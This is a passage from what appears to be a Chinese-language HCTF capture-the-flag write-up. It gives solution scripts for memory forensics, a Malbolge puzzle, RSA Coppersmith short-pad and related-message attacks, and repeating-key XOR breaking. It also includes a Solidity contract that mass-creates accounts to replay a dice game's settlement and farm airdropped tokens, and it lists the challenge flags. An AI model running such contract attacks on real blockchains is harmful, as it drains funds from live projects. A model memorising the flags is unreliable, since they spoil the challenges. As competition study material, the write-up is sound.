    print myresult2
    print "======myresult======"
    f = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(myresult1))
    mylist = json.loads(f.read())
    mycipher1 = mylist['raw_cipher'].split(',')
    f = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(myresult2))
    mylist = json.loads(f.read())
    mycipher2 = mylist['raw_cipher'].split(',')
    print getdst(mycipher1,oricipher)
    print getdst(mycipher2,oricipher)
    if mycipher1 == oricipher:
        print "mycipher1"
    if mycipher2 == oricipher:
        print "mycipher2"
最开始我预设的orilist二维数组是[[1,0] _48,[0,1]_ 48,[1,1,0,0] _24,[0,0,1,1]_
24],之后把距离结果空间向量更近的myresult作为新的key替换掉其中原本的key，一步一步缩小dst从而获得key的
### easy dump
Volatility + GIMP，可以查看内存里的内容，内存中有很多扫雷和写字板：i am boring真是服气2333  
在文件大概3/4的位置，可以看到flag在画图里
    hctf{big_brother_is_watching_you}
### difficult programming language
给了键盘流量包，可以使用一航师傅的脚本直接得到键盘输入的内容。【\是～`】
    D'`;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa'e^]\a`_X|V[Tx;"VONSRQJn1MFKJCBfFE>&  
发现这个字符串里还有输错的一个字符。  
经另一个工具的调试，可以得知是一个:写成了"号，解得flag
    hctf{m4lb0lGe}
### Questionnaire
谢谢杭电的师傅带来的题目们！
## crypto
### xor?rsa
这题目去网上找了一个Coppersmith’s Short Pad
Attack的脚本解就完事了(代码是sage的)。做的时候有时候会出bug我猜是因为程序只考虑了m1  = PolynomialRing(Zmod(n))
        PRx. = PolynomialRing(Zmod(n))
        PRZZ. = PolynomialRing(Zmod(n))
        g1 = x^e - c1
        g2 = (x+y)^e - c2
        q1 = g1.change_ring(PRZZ)
        q2 = g2.change_ring(PRZZ)
        h = q2.resultant(q1)
        h = h.univariate_polynomial()
        h = h.change_ring(PRx).subs(y=xn)
        h = h.monic()
        kbits = n.nbits()//(2*e*e)
        diff = h.small_roots(X=2^kbits, beta=0.5)[0]  # find root = n^0.5
        return diff
    def related_message_attack(c1, c2, diff, e, n):
        PRx. = PolynomialRing(Zmod(n))
        g1 = x^e - c1
        g2 = (x+diff)^e - c2
        def gcd(g1, g2):
            while g2:
                g1, g2 = g2, g1 % g2
            return g1.monic()
        return -gcd(g1, g2)[0]
    if __name__ == '__main__':
        n= 27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917
        c1= 13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871
        c2= 657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358
        e = 5
        diff = short_pad_attack(c1, c2, e, n)
        print "difference of two messages is %d" % diff
        m1 = related_message_attack(c1, c2, diff, e, n)
        m2 = m1 + diff
        print "------"
        print m1
        print "------"
        print pow(m1,e,n)
        print c1
        print "------"
        print m2
        print "------"
        print pow(m2,e,n)
        print c2
### xor game
[参考](https://www.anquanke.com/post/id/161171#h2-0)  
原理是汉明码，脚本如下:
    import base64
    import string
    def bxor(a, b):     # xor two byte strings of different lengths
        if len(a) > len(b):
            return bytes([x ^ y for x, y in zip(a[:len(b)], b)])
        else:
            return bytes([x ^ y for x, y in zip(a, b[:len(a)])])
    def hamming_distance(b1, b2):
        differing_bits = 0
        for byte in bxor(b1, b2):
            differing_bits += bin(byte).count("1")
        return differing_bits
    def break_single_key_xor(text):
        key = 0
        possible_space = 0
        max_possible = 0
        letters = string.ascii_letters.encode('ascii')
        for a in range(0, len(text)):
            maxpossible = 0
            for b in range(0, len(text)):
                if(a == b):
                    continue
                c = text[a] ^ text[b]
                if c not in letters and c != 0:
                    continue
                maxpossible += 1
            if maxpossible > max_possible:
                max_possible = maxpossible
                possible_space = a
        key = text[possible_space] ^ 0x20
        return chr(key)
    text = ''
    with open('cipher.txt', 'r') as f:
        for line in f:
            text += line
    b = base64.b64decode(text)
    normalized_distances = []
    for KEYSIZE in range(2, 40):
        b1 = b[: KEYSIZE]
        b2 = b[KEYSIZE: KEYSIZE * 2]
        b3 = b[KEYSIZE * 2: KEYSIZE * 3]
        b4 = b[KEYSIZE * 3: KEYSIZE * 4]
        b5 = b[KEYSIZE * 4: KEYSIZE * 5]
        b6 = b[KEYSIZE * 5: KEYSIZE * 6]
        normalized_distance = float(
            hamming_distance(b1, b2) +
            hamming_distance(b2, b3) +
            hamming_distance(b3, b4) +
            hamming_distance(b4, b5) +
            hamming_distance(b5, b6)
        ) / (KEYSIZE * 5)
        normalized_distances.append(
            (KEYSIZE, normalized_distance)
        )
    normalized_distances = sorted(normalized_distances, key=lambda x: x[1])
    for KEYSIZE, _ in normalized_distances[:5]:
        block_bytes = [[] for _ in range(KEYSIZE)]
        for i, byte in enumerate(b):
            block_bytes[i % KEYSIZE].append(byte)
        keys = ''
        try:
            for bbytes in block_bytes:
                keys += break_single_key_xor(bbytes)
            key = bytearray(keys * len(b), "utf-8")
            plaintext = bxor(b, key)
            print("keysize:", KEYSIZE)
            print("key is:", keys, "n")
            s = bytes.decode(plaintext)
            print(s)
        except Exception:
            continue
最后的结果:  
flag:`hctf{xor_is_interesting!@#}`
## blockchain
### bet2loss
一血！是个dice2win早期版本+erc20的题目，开奖函数可以重放，但是没看出来通过哪一步的重放能获得token。  
每个账号会空投1000 token，只需要一万个账号就可以拿到flag。遂发动薅羊毛攻击。还是很慢，希望下次换个链哈哈哈。
    pragma solidity ^0.4.20;
    contract Attack_7878678 {
    //    address[] private son_list;
        function Attack_7878678() payable {}
        function attack_starta(uint256 reveal_num) public {
            for(int i=0;i<=50;i++){
                son = new Son(reveal_num);
            }
        }
        function () payable {
        }
    }
    contract Son_7878678 {
        function Son_7878678(uint256 reveal_num) payable {
            address game = 0x006b9bc418e43e92cf8d380c56b8d4be41fda319;
            game.call(bytes4(keccak256("settleBet(uint256)")),reveal_num);
            game.call(bytes4(keccak256("transfer(address,uint256)")),0x5FA2c80DB001f970cFDd388143b887091Bf85e77,950);
        }
        function () payable{
        }
    }
    hctf{Ohhhh_r3p1ay_a77ack_f0r_c0n7r4ct}
### ez2win
    _transfer(address from, address to, uint256 amount);
未设置权限，可以随便转。开源了以后很简单就能拿到flag。
    hctf{0hhhh_m4k3_5ur3_y0ur_acc35s_c0n7r01}